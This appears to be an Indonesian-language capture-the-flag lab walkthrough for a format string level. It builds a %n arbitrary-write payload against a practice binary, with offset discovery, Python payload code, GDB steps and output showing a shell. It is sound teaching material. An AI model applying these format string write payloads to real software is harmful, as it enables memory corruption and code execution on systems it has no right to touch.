# Walkthrough: Level 2 - Basic Write (`%n`)
**Author**: Kenshin Himura

## Objective
Mengubah variable `target` dari 0 menjadi non-zero menggunakan `%n`.

## Konsep Dasar

**`%n` - the write primitive**:
- `%n` **menulis**, bukan membaca
- Menulis jumlah karakter yang sudah di-print ke address yang ditunjuk argumen
- Argumen = address di stack -> target ditimpa

```
Payload: [address_target] + %{offset}$n
                 ↓
    printf sudah print 4 karakter (bytes dari address)
                 ↓
    %n menulis "4" ke address target
                 ↓
    target -> 4 (non-zero) -> win()!
```

## Step-by-Step

### 1. Compile
```bash
make level2
```

### 2. Dapatkan address target
```bash
$ ./format2
target @ 0x0804c040 (current value: 0)
```

### 3. Temukan offset
```bash
$ echo 'AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' | ./format2
```
Cari `0x41414141` -> offset N.

### 4. Hitung payload
Address target = 4 bytes. %n akan menulis angka 4 ke target (karena sudah print 4 bytes).

Jadi cukup: `[address] + %{N}$n`

```python
import struct
target_addr = 0x0804c040
offset = 7
payload = struct.pack('<I', target_addr) + f'%{offset}$n'.encode()
```

### 5. Exploit
```bash
$ python3 -c "
import struct
payload = struct.pack('<I', 0x0804c040) + b'%7\$n'
print(payload.decode('latin-1'))
" | ./format2
```

Output:
```
[+] target successfully modified!
[+] Exploit successful! Spawning shell...
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

### 6. Variasi: tulis nilai spesifik
Ingin menulis `100` (bukan 4)? Gunakan width modifier:

```python
# target_addr(4 bytes) + %{100-4}x%{offset}$n
# %96x -> print 96 karakter padding -> total = 4 + 96 = 100
payload = struct.pack('<I', target_addr) + f'%96x%{offset}$n'.encode()
```

### 7. Debug dengan GDB
```bash
$ gdb ./format2
(gdb) b *vuln+??  # set breakpoint setelah printf
(gdb) r
(gdb) x/wx &target
# target berubah dari 0 menjadi non-zero
```

## Catatan Penting
- `%n` menulis **4 byte** (int)
- Nilai yang ditulis = **jumlah total karakter yang sudah di-print**
- Width modifier (`%96x`) mengontrol jumlah karakter yang di-print
- Address **harus valid & writable** - kalau tidak -> SIGSEGV

## Takeaways
- `%n` = arbitrary write primitive
- Width modifier (`%96x`) mengontrol jumlah karakter yang di-print - menentukan nilai yang ditulis
- Level 3: menulis nilai presisi dengan `%hn`. Level 4: overwrite GOT.

## Automation
```bash
python3 exploit2.py
```
